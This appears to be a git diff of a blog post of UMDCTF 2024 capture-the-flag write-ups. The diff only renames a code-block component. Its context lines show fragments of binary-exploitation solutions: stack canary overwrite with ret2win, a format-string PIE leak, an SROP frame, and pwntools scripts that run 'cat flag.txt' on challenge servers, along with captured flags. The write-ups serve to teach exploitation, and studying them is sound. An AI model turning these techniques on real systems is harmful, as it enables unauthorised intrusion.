@@ -5,7 +5,7 @@ description: "Writeups for several challenges from UMDCTF"
 heroImage: "/img/writeups/2024/UMDCTF-24/umdctf-24-hero.png"
 ---
 
-import CollapsableCodeBlock from "../../../../components/CollapsableCodeBlock.astro";
+import CollapseBlock from "../../../../components/CollapseBlock.astro";
 
 Hey! How's it been, I know it's been a while since my last update. I've been busy with school, but I'm back with some writeups for UMDCTF 2024. I hope you enjoy them!
 
@@ -21,7 +21,7 @@ These were some great challenges, though my solves for the rev might be a bit no
 > `nc challs.umdctf.io 31192`
 
 They give us source, so let's take a look at it.
-<CollapsableCodeBlock filename="the_voice.c">
+<CollapseBlock filename="the_voice.c">
 ```c
 #include <stdio.h>
 #include <stdlib.h>
@@ -47,7 +47,7 @@ int main() {
     g[atoi(command)] = 10191;
 }
 ```
-</CollapsableCodeBlock>
+</CollapseBlock>
 And here's `checksec`:
 ```bash
 $ checksec ./the_voice
@@ -62,7 +62,7 @@ This looks pretty simple, we have a BOF in the `gets` call and we can overwrite 
 With our overwrite, we can overwrite the stack canary, then perform a simple ret2win to get the flag. Finding the exact offset to overwrite the canary just requires a peek in GDB, and we also need to add a ret gadget to align the stack properly.
 
 Here's the exploit:
-<CollapsableCodeBlock filename="solve.py">
+<CollapseBlock filename="solve.py">
 ```python
 #!/usr/bin/env python3
 from pwn import *
@@ -98,7 +98,7 @@ r.sendline(payload)
 
 r.interactive()
 ```
-</CollapsableCodeBlock>
+</CollapseBlock>
 ```
 [+] Opening connection to challs.umdctf.io on port 31192: Done
 [*] Switching to interactive mode
@@ -114,7 +114,7 @@ UMDCTF{pwn_g3ss3r1t_sk1ll5_d0nt_tak3_a5_many_y3ar5_t0_l3arn_pau1}
 > `nc challs.umdctf.io 32300`
 
 Here's the source:
-<CollapsableCodeBlock filename="mentat_question.c">
+<CollapseBlock filename="mentat_question.c">
 ```c
 #include <stdlib.h>
 #include <stdio.h>
@@ -184,7 +184,7 @@ int main() {
     return 0;
 }
 ```
-</CollapsableCodeBlock>
+</CollapseBlock>
 ```bash
 $ checksec ./mentat-question
     Arch:     amd64-64-little
@@ -196,7 +196,7 @@ $ checksec ./mentat-question
 This time, we don't have a canary, but we do have PIE. Additionally, in the `calculate` function, we have a both a BOF and a format string vulnerability. We can use the format string vulnerability to leak an address to break PIE, then use the BOF for a simple ret2win.
 
 Here's the exploit. First we leak the address of `main` which just so happens to be left on the stack for us. Then, we overwrite the return address with the address of `secret` to get the flag.
-<CollapsableCodeBlock filename="solve.py">
+<CollapseBlock filename="solve.py">
 ```python
 #!/usr/bin/env python3
 from pwn import *
@@ -244,7 +244,7 @@ r.sendlineafter(b'again?\n', payload)
 
 r.interactive()
 ```
-</CollapsableCodeBlock>
+</CollapseBlock>
 ```
 [+] Opening connection to challs.umdctf.io on port 32300: Done
 [*] Switching to interactive mode
@@ -262,7 +262,7 @@ $
 >
 > `nc challs.umdctf.io 31721`
 
-<CollapsableCodeBlock filename="the_spice.c">
+<CollapseBlock filename="the_spice.c">
 ```c
 #include <stdio.h>
 #include <stdlib.h>
@@ -403,7 +403,7 @@ done:
     return spice <= 0;
 }
 ```
-</CollapsableCodeBlock>
+</CollapseBlock>
 ```bash
 $ checksec ./the_spice
 [*] '/mnt/d/Cybersecurity/2024/umdctf/PwnUpsolve/the_spice/the_spice'
@@ -534,7 +534,7 @@ frame.rip = 0x401274 # back to syscall
 payload += bytes(frame)
 ```
 Here's the full exploit: 
-<CollapsableCodeBlock filename="solve.py">
+<CollapseBlock filename="solve.py">
 ```python
 #!/usr/bin/env python3
 from pwn import *
@@ -613,7 +613,7 @@ r.sendline(b'cat flag.txt')
 
 r.interactive()
 ```
-</CollapsableCodeBlock>
+</CollapseBlock>
 ```
 [+] Opening connection to challs.umdctf.io on port 31721: Done
 Canary: 0xd55b629010f55d00
@@ -657,7 +657,7 @@ For the OCaml one, it does something similar, where it checks one byte at a time
 > Note: you will need to set `-ftemplate-depth=10000` when compiling.
 
 We're given 2 files, `templates.hpp`, and `main.cpp`:
-<CollapsableCodeBlock filename="templates.hpp">
+<CollapseBlock filename="templates.hpp">
 ```cpp
 #include <type_traits>
 
@@ -802,8 +802,8 @@ struct vm<S, cons<V<4>, cons<V<PV>, R>>, In>  {
 template <typename S, typename IT, typename In>
 using vm_t = typename vm<S, IT, In>::type;
 ```
-</CollapsableCodeBlock>
-<CollapsableCodeBlock filename="main.cpp">
+</CollapseBlock>
+<CollapseBlock filename="main.cpp">
 ```cpp
 #include "templates.hpp"
 
@@ -818,7 +818,7 @@ int main() {
     b = (nil_t)b;
 }
 ```
-</CollapsableCodeBlock>
+</CollapseBlock>
 
 These are both huge files, so I'll give a quick rundown.
 First, `main.cpp` is the actual file that is "run". In this case, checking the flag involves being able to compile the file.
@@ -1111,7 +1111,7 @@ def shuffle(data):
 ```
 
 Then all we have to do is unshuffle the output and brute force each character until we get the flag:
-<CollapsableCodeBlock filename="solve.py">
+<CollapseBlock filename="solve.py">
 ```python
 from pwn import process
 from tqdm import tqdm
@@ -1164,7 +1164,7 @@ for c in tqdm(alphabet):
 
 print(''.join(flag))
 ```
-</CollapsableCodeBlock>
+</CollapseBlock>
 ```
 $ python solve.py
 100%|████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 76/76 [00:49<00:00,  1.54it/s]
